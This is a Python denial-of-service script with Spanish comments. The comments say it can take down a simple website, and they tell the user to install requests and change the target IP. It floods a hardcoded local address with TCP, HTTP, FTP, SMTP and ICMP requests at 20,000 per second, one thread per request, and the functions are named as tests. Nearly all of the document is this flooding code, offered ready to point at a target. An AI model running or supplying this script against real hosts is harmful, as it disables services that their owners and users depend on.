# En este Denegacion de servicio se pone un limite de paqeutes 
# Que pueden afectar una pagina web sencilla tumbandola con 50000 peticiones
# Primero se instala requests con el siguiente comando "pip install requests"
# Luego de bajar librerias, las importamos
# Enviar millones de conexiones falsas (en Python, red local)
import socket
import requests
import ftplib
import smtplib
import time
import threading
from scapy.all import ICMP, IP, sr1, UDP, BOOTP, DHCP, send, Ether

TARGET_IP = '192.168.1.11'  # Cambia a IP destino
REQUESTS_PER_SECOND = 20000
DURATION_SECONDS = 5

def tcp_test(ip, port=80):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip, port))
        s.sendall(b'Hello TCP')
        s.close()
    except:
        pass

def http_test(ip):
    url = f'http://{ip}'
    try:
        requests.get(url, timeout=1)
    except:
        pass

def ftp_test(ip):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, 21, timeout=1)
        ftp.quit()
    except:
        pass

def smtp_test(ip):
    try:
        server = smtplib.SMTP(ip, 25, timeout=1)
        server.quit()
    except:
        pass

def icmp_test(ip):
    pkt = IP(dst=ip)/ICMP()
    sr1(pkt, timeout=1, verbose=0)


def send_requests_per_second(protocol_func, count_per_sec, duration_sec):
    interval = 1.0 / count_per_sec
    end_time = time.time() + duration_sec
    while time.time() < end_time:
        threading.Thread(target=protocol_func, args=(TARGET_IP,)).start()
        time.sleep(interval)

if __name__ == '__main__':
    print("Iniciando envío controlado de peticiones...")

    # TCP
    send_requests_per_second(tcp_test, REQUESTS_PER_SECOND, DURATION_SECONDS)
    print("Iniciando envío controlado de peticiones http...")
    # HTTP
    send_requests_per_second(http_test, REQUESTS_PER_SECOND, DURATION_SECONDS)
    print("Iniciando envío controlado de peticiones ftp...")
    # FTP
    send_requests_per_second(ftp_test, REQUESTS_PER_SECOND, DURATION_SECONDS)
    print("Iniciando envío controlado de peticiones smtp...")
    # SMTP
    send_requests_per_second(smtp_test, REQUESTS_PER_SECOND, DURATION_SECONDS)
    print("Iniciando envío controlado de peticiones icmp...")
    # ICMP (requiere permisos root/admin)
    send_requests_per_second(icmp_test, REQUESTS_PER_SECOND, DURATION_SECONDS)

    print("Finalizado.")